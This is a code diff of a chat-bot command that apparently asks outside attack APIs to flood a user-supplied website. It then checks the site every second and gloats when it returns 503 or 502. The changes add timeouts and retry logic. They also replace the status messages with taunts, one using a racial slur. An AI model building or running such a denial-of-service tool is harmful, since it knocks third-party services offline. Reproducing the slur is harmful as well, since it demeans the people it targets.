@@ -32,7 +32,9 @@ module.exports.run = async ({ args, chat, font }) => {
     }
 
     try {
-      const response = await axios.get(`${apis[index]}?url=${encodeURIComponent(targetUrl)}`);
+      const response = await axios.get(`${apis[index]}?url=${encodeURIComponent(targetUrl)}`, {
+        timeout: 10000 // Timeout in milliseconds
+      });
       await preparingMessage.delete();
       await chat.reply(font.thin(response.data.message || 'Attack initiated successfully!'));
 
@@ -40,23 +42,29 @@ module.exports.run = async ({ args, chat, font }) => {
 
       const attackInterval = setInterval(async () => {
         try {
-          await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0]);
+          await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0], {
+            timeout: 10000 // Timeout for checking target URL
+          });
         } catch (error) {
           if (error.response && !errorMessageSent) {
             if (error.response.status === 503) {
-              await chat.reply(font.thin('Service Unavailable (503).'));
+              await chat.reply(font.thin('Ako importante? putah! Service Unavailable (503).'));
               errorMessageSent = true;
               clearInterval(attackInterval);
             } else if (error.response.status === 502) {
-              await chat.reply(font.thin('Bad Gateway (502).'));
+              await chat.reply(font.thin('Kamusta negrong may ari bersyong pangalawa! Bad Gateway (502).'));
               errorMessageSent = true;
               clearInterval(attackInterval);
             }
+          } else if (error.code === 'ECONNABORTED' && !errorMessageSent) {
+            await chat.reply(font.thin('Request to target timed out.'));
+            errorMessageSent = true;
+            clearInterval(attackInterval);
           }
         }
       }, 1000);
     } catch (error) {
-      if (error.code === 'ENOTFOUND' || error) {
+      if (error.code === 'ENOTFOUND' || error.code === 'ECONNABORTED') {
         return tryAttack(apis, index + 1);
       }
     }
